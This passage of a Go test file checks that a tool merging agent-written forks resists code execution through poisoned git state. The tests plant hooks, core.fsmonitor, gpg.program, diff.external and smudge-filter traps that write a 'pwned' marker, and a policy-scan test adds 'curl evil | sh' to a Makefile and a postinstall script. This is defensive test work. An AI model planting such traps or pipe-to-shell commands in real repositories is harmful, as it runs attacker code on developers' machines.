	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	pre := gitOut(repo, "rev-parse", "HEAD")
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	c.gateOK = func(_, _, _ string) bool { return false } // red gate
	landed, err := mergeOneForTest(t, c, repo, "gate-img", "perf", false)
	if landed || err == nil {
		t.Fatalf("mergeOne = (%v, %v), want a gate failure", landed, err)
	}
	if pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("the fork landed despite a red gate")
	}
	if head := gitOut(repo, "rev-parse", "HEAD"); head != pre {
		t.Errorf("parent HEAD moved on a red gate: %s → %s", pre, head)
	}
	if gitDirty(repo) {
		t.Error("parent tree left dirty after a red gate")
	}
}

// TestMergeOneGatePassLands: a green gate advances the parent (the seam lets this run without a box).
func TestMergeOneGatePassLands(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "perf")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("fork work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "fork work")
	c.gateOK = func(_, _, _ string) bool { return true } // green gate
	landed, err := mergeOneForTest(t, c, repo, "gate-img", "perf", false)
	if !landed || err != nil {
		t.Fatalf("mergeOne = (%v, %v), want (true, nil)", landed, err)
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("a green gate should have landed the fork")
	}
}

func TestMergeOnePolicyForce(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "leak")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, ".env"), []byte("S=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "leak")

	// Without --force the policy guard blocks the secret-like file.
	if landed, err := mergeOneForTest(t, c, repo, "", "leak", false); landed || err == nil {
		t.Fatalf("mergeOne(force=false) = (%v, %v), want blocked", landed, err)
	}
	if pathExists(filepath.Join(repo, ".env")) {
		t.Fatal(".env landed despite the policy block")
	}
	// With --force it lands.
	if landed, err := mergeOneForTest(t, c, repo, "", "leak", true); !landed || err != nil {
		t.Fatalf("mergeOne(force=true) = (%v, %v), want landed", landed, err)
	}
	if !pathExists(filepath.Join(repo, ".env")) {
		t.Error(".env not landed with --force")
	}
}

// plantForkBooby rigs a fork's agent-writable .git/ to run host commands: every git
// hook plus the config knobs that shell out (core.fsmonitor, core.hooksPath, and a
// forced commit.gpgsign with a planted gpg.program). Each writes a line to marker, so
// its existence proves something in the fork executed on the host.
func plantForkBooby(t *testing.T, ws, marker string) {
	t.Helper()
	hooks := filepath.Join(ws, ".git", "hooks")
	if err := os.MkdirAll(hooks, 0o755); err != nil {
		t.Fatal(err)
	}
	script := "#!/bin/sh\necho pwned >> " + marker + "\n"
	for _, h := range []string{"pre-rebase", "post-rewrite", "post-checkout", "post-commit", "post-merge"} {
		if err := os.WriteFile(filepath.Join(hooks, h), []byte(script), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	// A standalone script reused for the command-running config knobs (gpg.program
	// must still emit a signature, so it cats stdin after marking).
	evil := filepath.Join(ws, ".git", "evil.sh")
	if err := os.WriteFile(evil, []byte(script+"cat\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "core.hooksPath", hooks)
	git(t, ws, "config", "core.fsmonitor", evil)
	git(t, ws, "config", "commit.gpgsign", "true")
	git(t, ws, "config", "gpg.program", evil)
}

// A fork's .git/ is agent-writable, so the host-side git commands a merge runs in it
// must not execute fork-planted hooks or command-running config.
func TestMergeOneIgnoresForkBooby(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}

	ws, err := forkspace.Setup(repo, "evil")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "feature.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent on a different file so landing must rebase/replay (which is
	// what fires pre-rebase/post-checkout/post-rewrite) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	marker := filepath.Join(t.TempDir(), "PWNED")
	plantForkBooby(t, ws, marker)

	landed, err := mergeOneForTest(t, c, repo, "", "evil", false)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatalf("a fork-controlled git hook/config executed on the host during merge (marker created)")
	}
	if !pathExists(filepath.Join(repo, "feature.txt")) {
		t.Error("merge did not land the fork's work")
	}
	// Positive control: the trap is live — a genuinely *raw* git command (bypassing coop's now-
	// hardened helpers entirely) fires it, so the clean run above is the hardening working, not a
	// no-op test. (gitDirty itself is hardened now, so it can't be the control any more.)
	_ = exec.Command("git", "-C", ws, "status", "--porcelain").Run() // raw → runs the planted core.fsmonitor
	if !pathExists(marker) {
		t.Fatal("positive control failed: raw fork git did not trigger the booby trap, so the test proves nothing")
	}
}

// A non-interactive `coop fork merge` must refuse without --yes (it lands work and
// deletes the fork), and proceed with it.
func TestForkMergeNonTTYRequiresYes(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	// Force a non-interactive stdin regardless of how the suite is run — a real TTY
	// would send the un-gated path into an interactive prompt and block.
	devnull, err := os.Open(os.DevNull)
	if err != nil {
		t.Fatal(err)
	}
	defer devnull.Close()
	saved := os.Stdin
	os.Stdin = devnull
	defer func() { os.Stdin = saved }()

	repo := initRepo(t)
	c := &Control{cfg: &config.Config{RepoOverride: repo}} // no gate → no box
	ws, err := forkspace.Setup(repo, "a")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	if err := os.WriteFile(filepath.Join(ws, "a.txt"), []byte("work\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")

	// Without --yes: refuse, before landing, fork intact.
	if code, err := c.ForkMerge([]string{"a"}); err == nil || code == 0 {
		t.Fatalf("ForkMerge(no --yes) = (%d, %v), want a refusal", code, err)
	}
	if pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt landed despite the non-interactive refusal")
	}
	if !pathExists(ws) {
		t.Error("fork was removed despite the refusal")
	}

	// With --yes: lands and removes the fork.
	if code, err := c.ForkMerge([]string{"a", "--yes"}); err != nil || code != 0 {
		t.Fatalf("ForkMerge(--yes) = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) {
		t.Error("a.txt did not land with --yes")
	}
	if pathExists(ws) {
		t.Error("fork not removed after a --yes land")
	}
}

func TestForkMergeQueue(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	// Two independent forks, each adding a distinct file.
	for _, n := range []string{"a", "b"} {
		ws, err := forkspace.Setup(repo, n)
		if err != nil {
			t.Fatalf("forkspace.Setup %s: %v", n, err)
		}
		if err := os.WriteFile(filepath.Join(ws, n+".txt"), []byte(n+"\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		git(t, ws, "add", "-A")
		git(t, ws, "commit", "-qm", n)
	}
	names, err := forkspace.Names(repo)
	if err != nil {
		t.Fatal(err)
	}
	if code, err := c.forkMergeAll(repo, names, "", false, true); err != nil || code != 0 { // yes=true: approve the bulk land
		t.Fatalf("forkMergeAll = (%d, %v), want (0, nil)", code, err)
	}
	if !pathExists(filepath.Join(repo, "a.txt")) || !pathExists(filepath.Join(repo, "b.txt")) {
		t.Error("merge queue did not land both forks")
	}
	if got, err := forkspace.Names(repo); err != nil || len(got) != 0 {
		t.Errorf("forks remain after the queue closed them: %v", got)
	}
	// Rebasing must keep history linear — no merge commits.
	if merges := gitOut(repo, "rev-list", "--merges", "HEAD"); merges != "" {
		t.Errorf("rebase queue produced merge commits (history not linear):\n%s", merges)
	}
}

// Task (security 1): every host-side git command coop runs against the PARENT repo must be
// hardened too — the parent's .git (config + hooks) is agent-writable on a normal box run, so a
// poisoned knob must not execute host code when coop reads/merges/diffs it. Each case fires a
// positive control with genuinely raw git, so a green test means the hardening works, not a dead
// trap. (Forks were already covered by TestMergeOneIgnoresForkBooby; this guards the parent.)
func TestHostGitHardeningOnPoisonedParent(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	markerScript := func(t *testing.T, path, marker string) {
		t.Helper()
		if err := os.WriteFile(path, []byte("#!/bin/sh\necho pwned >> "+marker+"\n"), 0o755); err != nil {
			t.Fatal(err)
		}
	}

	// (a) a poisoned core.fsmonitor must not fire when coop runs `git status` (gitDirty).
	t.Run("fsmonitor on status", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "core.fsmonitor", evil)
		_ = gitDirty(repo) // hardened — must not run fsmonitor
		if pathExists(marker) {
			t.Fatal("gitDirty ran the parent's core.fsmonitor on the host")
		}
		_ = exec.Command("git", "-C", repo, "status", "--porcelain").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git status did not fire the planted fsmonitor")
		}
	})

	// (b) a planted post-merge hook must not fire through the merge helper (FastForwardParent ff's the parent).
	t.Run("post-merge hook on merge", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		hooks := filepath.Join(repo, ".git", "hooks")
		if err := os.MkdirAll(hooks, 0o755); err != nil {
			t.Fatal(err)
		}
		markerScript(t, filepath.Join(hooks, "post-merge"), marker)
		git(t, repo, "config", "core.hooksPath", ".git/hooks")
		ahead := func(branch string) { // a branch one commit ahead of main, so --ff-only fast-forwards
			git(t, repo, "checkout", "-q", "-b", branch)
			if err := os.WriteFile(filepath.Join(repo, branch+".txt"), []byte("x\n"), 0o644); err != nil {
				t.Fatal(err)
			}
			git(t, repo, "add", "-A")
			git(t, repo, "commit", "-qm", branch)
			git(t, repo, "checkout", "-q", "main")
		}
		ahead("a1")
		if err := gitRun(repo, "merge", "--ff-only", "a1"); err != nil { // hardened
			t.Fatalf("merge a1: %v", err)
		}
		if pathExists(marker) {
			t.Fatal("the parent's post-merge hook fired through the hardened merge helper")
		}
		ahead("a2")
		_ = exec.Command("git", "-C", repo, "merge", "--ff-only", "a2").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git merge did not fire the planted post-merge hook")
		}
	})

	// (c) a poisoned diff.external must not run when coop diffs the parent.
	t.Run("diff.external on diff", func(t *testing.T) {
		repo := initRepo(t)
		marker := filepath.Join(t.TempDir(), "PWNED")
		evil := filepath.Join(repo, ".git", "evil.sh")
		markerScript(t, evil, marker)
		git(t, repo, "config", "diff.external", evil)
		if err := os.WriteFile(filepath.Join(repo, "README.md"), []byte("changed\n"), 0o644); err != nil {
			t.Fatal(err)
		}
		_ = gitOut(repo, "diff") // hardened — diff.external blanked
		if pathExists(marker) {
			t.Fatal("gitOut diff ran the parent's diff.external on the host")
		}
		_ = exec.Command("git", "-C", repo, "diff").Run() // raw control
		if !pathExists(marker) {
			t.Fatal("positive control failed: raw git diff did not run the planted diff.external")
		}
	})
}

func TestForkMergeAllRefusesWithoutApproval(t *testing.T) {
	repo := initRepo(t)
	// Stage two fork workspaces so forkspace.Names lists them; their mere existence is enough — the
	// approval gate fires before any fetch/land/destroy.
	for _, n := range []string{"a", "b"} {
		if err := os.MkdirAll(forkspace.Workspace(repo, n), 0o755); err != nil {
			t.Fatal(err)
		}
	}
	c := &Control{cfg: &config.Config{}}
	// Non-interactive stdin without --yes must fail before fetch, land or deletion.
	names, err := forkspace.Names(repo)
	if err != nil {
		t.Fatal(err)
	}
	code, err := c.forkMergeAll(repo, names, "", false, false)
	if err == nil || code != 2 {
		t.Fatalf("forkMergeAll = (%d, %v), want explicit refusal", code, err)
	}
	for _, n := range []string{"a", "b"} {
		if !pathExists(forkspace.Workspace(repo, n)) {
			t.Errorf("fork %s was destroyed without approval", n)
		}
	}
}

// PolicyScan flags files that auto-run host code post-merge (.envrc, package.json lifecycle
// scripts), while leaving a benign package.json edit alone — and --force still lands (the warns
// are advisory). Build the change as a branch so PolicyScan's `HEAD...ref` diff is exercised.
func TestPolicyScanFlagsInteractionFiles(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "Makefile"), []byte("all:\n\ttrue\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "base package.json")

	// A branch that introduces an .envrc, a commit hook, a Makefile edit, and a postinstall script.
	git(t, repo, "checkout", "-q", "-b", "evil")
	if err := os.WriteFile(filepath.Join(repo, ".envrc"), []byte("export X=1\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.MkdirAll(filepath.Join(repo, ".githooks"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, ".githooks", "pre-commit"), []byte("#!/bin/sh\n"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "Makefile"), []byte("all:\n\tcurl evil | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","scripts":{"test":"go test","postinstall":"curl evil | sh"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "evil")
	git(t, repo, "checkout", "-q", "main")

	w := strings.Join(PolicyScan(repo, "evil"), "\n")
	if !strings.Contains(w, ".envrc") {
		t.Errorf("PolicyScan did not flag .envrc:\n%s", w)
	}
	if !strings.Contains(w, "postinstall") {
		t.Errorf("PolicyScan did not flag the added postinstall script:\n%s", w)
	}
	// A hook runs by itself on the reviewer's next commit, so it blocks the merge; the Makefile
	// only runs when they choose to run make, so it is listed for the review but never blocks.
	if !strings.Contains(w, ".githooks/pre-commit — Runs during Git operations.") {
		t.Errorf("PolicyScan did not flag the commit hook:\n%s", w)
	}
	if strings.Contains(w, "Makefile") {
		t.Errorf("PolicyScan blocked on a Makefile edit:\n%s", w)
	}
	var surfaces []string
	for _, f := range HostSurfaces(repo, "evil") {
		surfaces = append(surfaces, f.Path)
	}
	if got := strings.Join(surfaces, " "); got != ".envrc .githooks/pre-commit Makefile" {
		t.Errorf("HostSurfaces = %q; want the three files that change what runs on the host", got)
	}

	// A branch that edits package.json benignly (version bump, no new lifecycle script) is not flagged.
	git(t, repo, "checkout", "-q", "-b", "benign", "main")
	if err := os.WriteFile(filepath.Join(repo, "package.json"), []byte(`{"name":"x","version":"2","scripts":{"test":"go test"}}`), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "bump")
	git(t, repo, "checkout", "-q", "main")
	if w := strings.Join(PolicyScan(repo, "benign"), "\n"); strings.Contains(w, "package.json adds") {
		t.Errorf("a benign package.json edit was wrongly flagged:\n%s", w)
	}
}

// A fork's in-tree .gitattributes + a fork-local smudge filter must not run on the land rebase's
// checkout. Includes a positive control (a raw re-checkout fires the smudge) so a green test means
// the neutralizer worked, not that the filter is dead.
func TestMergeNeutralizesForkDrivers(t *testing.T) {
	if _, err := exec.LookPath("git"); err != nil {
		t.Skip("git not available")
	}
	repo := initRepo(t)
	c := &Control{cfg: &config.Config{}}
	ws, err := forkspace.Setup(repo, "drv")
	if err != nil {
		t.Fatalf("forkspace.Setup: %v", err)
	}
	marker := filepath.Join(t.TempDir(), "PWNED")
	smudge := "sh -c 'echo pwned >> " + marker + "; cat'"
	if err := os.WriteFile(filepath.Join(ws, ".gitattributes"), []byte("data.txt filter=x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(ws, "data.txt"), []byte("hi\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "config", "filter.x.smudge", smudge)
	git(t, ws, "config", "filter.x.clean", "cat")
	git(t, ws, "add", "-A")
	git(t, ws, "commit", "-qm", "work")
	// Advance the parent so landing must rebase (a checkout) rather than fast-forward.
	if err := os.WriteFile(filepath.Join(repo, "other.txt"), []byte("p\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, repo, "add", "-A")
	git(t, repo, "commit", "-qm", "parent moves")

	// Positive control: a raw re-checkout of data.txt fires the smudge — the trap is live.
	_ = os.Remove(filepath.Join(ws, "data.txt"))
	_ = exec.Command("git", "-C", ws, "checkout", "--", "data.txt").Run()
	if !pathExists(marker) {
		t.Skip("the smudge filter did not fire on this git version — can't prove the neutralizer here")
	}
	_ = os.Remove(marker)

	// The land rebase must NOT fire it. A .gitattributes change is a host surface (the reviewer's
	// own git would run the filter), so the merge refuses it until forced.
	if _, err := c.mergeOne(repo, "", "drv", false); err == nil || !strings.Contains(err.Error(), ".gitattributes") {
		t.Fatalf("mergeOne without --force = %v; want a refusal naming .gitattributes", err)
	}
	landed, err := mergeOneForTest(t, c, repo, "", "drv", true)
	if err != nil || !landed {
		t.Fatalf("mergeOne = (%v, %v), want landed", landed, err)
	}
	if pathExists(marker) {
		t.Fatal("the fork's smudge filter executed on the host during the land rebase")
	}
}

// `image inspect` fails the same way for a missing image and a dead daemon, so a merge gate blocked
// by a stopped runtime used to demand a build that would not have helped. Name the daemon instead.
func TestMergeGateBlamesTheDaemonNotTheImage(t *testing.T) {
	for _, tc := range []struct {
		name     string
		infoExit string
		want     string
	}{
		{"daemon unreachable", "1", "Docker is unavailable"},
		{"daemon up, image absent", "0", "isn't built"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			// Named "docker": EnsureDaemon probes only the Docker kind, which it reads off the binary.
			shim := filepath.Join(t.TempDir(), "docker")
			script := "#!/bin/sh\n" +
				"case \"$1\" in info) exit " + tc.infoExit + " ;; esac\n" +
				"case \"$1$2\" in imageinspect) exit 1 ;; esac\n" +
				"exit 0\n"
			if err := os.WriteFile(shim, []byte(script), 0o755); err != nil {
				t.Fatal(err)
			}
			c := &Control{
				cfg: &config.Config{Gate: []string{"true"}, BaseImage: "coop-box"},
				rt:  runtime.Runtime{Name: shim},
			}
			_, err := c.MergeGate(t.TempDir())
			if err == nil {
				t.Fatal("MergeGate succeeded with no image; want an error")
			}
			if !strings.Contains(err.Error(), tc.want) {
				t.Errorf("MergeGate = %q, want it to mention %q", err, tc.want)
			}
		})
	}
}

// A red merge gate restores the reviewed candidate; the fix then lands as commits on top of it.
// Retiring the stale candidate returns its owners to reviewing so the next signoff republishes
// the new HEAD and the merge lands the fixed fork — while a HEAD that does not descend from the
// candidate still fails closed.
func TestTaskCandidateCanBeFixedAndRemergedAfterARedGate(t *testing.T) {
	repo, ws, root, identity, c := prepareForkTaskCandidate(t, "task-red-gate-fix")
	candidate, ok, err := tasks.ReadForkCandidate(repo, identity)
	if err != nil || !ok {
		t.Fatalf("read candidate: ok=%v err=%v", ok, err)
	}
	c.gateOK = func(_, _, _ string) bool { return false }
	if landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false); landed || err == nil || !strings.Contains(err.Error(), "candidate restored") {
		t.Fatalf("red-gate merge = (%v, %v)", landed, err)
	}
	if retired, err := tasks.RetireStaleForkCandidate(repo, identity, gitOut(ws, "rev-parse", "HEAD")); retired || err != nil {
		t.Fatalf("retire at the candidate's own HEAD = (%v, %v); want nothing to retire", retired, err)
	}

	// History rewritten under the candidate: not a descendant, so the candidate stays.
	git(t, ws, "commit", "-q", "--amend", "-m", "rewritten candidate\n\nCoop-Task: canonical-task")
	rewritten := gitOut(ws, "rev-parse", "HEAD")
	if retired, err := tasks.RetireStaleForkCandidate(repo, identity, rewritten); retired || err == nil || !strings.Contains(err.Error(), "no longer descends") {
		t.Fatalf("retire on rewritten history = (%v, %v); want a fail-closed refusal", retired, err)
	}
	if _, ok, err := tasks.ReadForkCandidate(repo, identity); err != nil || !ok {
		t.Fatalf("candidate lost on a refused retirement: ok=%v err=%v", ok, err)
	}
	git(t, ws, "reset", "-q", "--hard", candidate.Head)

	// The real fix: commits on top of the reviewed candidate.
	if err := os.WriteFile(filepath.Join(ws, "fix.txt"), []byte("gate fixed\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	git(t, ws, "add", "fix.txt")
	git(t, ws, "commit", "-qm", "fix the gate\n\nCoop-Task: canonical-task")
	fixedHead, fixedTree := gitOut(ws, "rev-parse", "HEAD"), gitOut(ws, "rev-parse", "HEAD^{tree}")
	if retired, err := tasks.RetireStaleForkCandidate(repo, identity, fixedHead); !retired || err != nil {
		t.Fatalf("retire after the fix = (%v, %v); want the stale candidate retired", retired, err)
	}
	if _, ok, err := tasks.ReadForkCandidate(repo, identity); err != nil || ok {
		t.Fatalf("stale candidate survives: ok=%v err=%v", ok, err)
	}
	record, owned, err := tasks.ReadTaskOwnerRecord(root, "canonical-task")
	if err != nil || !owned || record.Fork == nil || record.Fork.Phase != tasks.ForkAssignmentReviewing || record.Fork.CandidateID != "" {
		t.Fatalf("owner after retirement = %+v, owned=%v err=%v; want reviewing with no candidate", record.Fork, owned, err)
	}
	// Retiring again is a no-op: nothing is published, nothing changes.
	if retired, err := tasks.RetireStaleForkCandidate(repo, identity, fixedHead); retired || err != nil {
		t.Fatalf("second retirement = (%v, %v)", retired, err)
	}

	// The next signoff republishes the fixed HEAD, and a green gate lands it.
	if _, published, err := tasks.PublishForkCandidate(repo, identity, fixedHead, fixedTree); err != nil || !published {
		t.Fatalf("republish after the fix: published=%v err=%v", published, err)
	}
	c.gateOK = func(_, _, _ string) bool { return true }
	if landed, err := mergeOneForTest(t, c, repo, "gate-img", identity.Name, false); !landed || err != nil {
		t.Fatalf("merge after the fix = (%v, %v)", landed, err)
	}
	if data, err := os.ReadFile(filepath.Join(repo, "fix.txt")); err != nil || string(data) != "gate fixed\n" {
		t.Fatalf("fix did not land: %q, %v", data, err)
	}
	if item, ok := mustCurrentTask(t, root, "canonical-task"); !ok || item.State != tasks.StateDone {
		t.Fatalf("canonical task after the fixed merge = %+v, ok=%v", item, ok)
	}
}
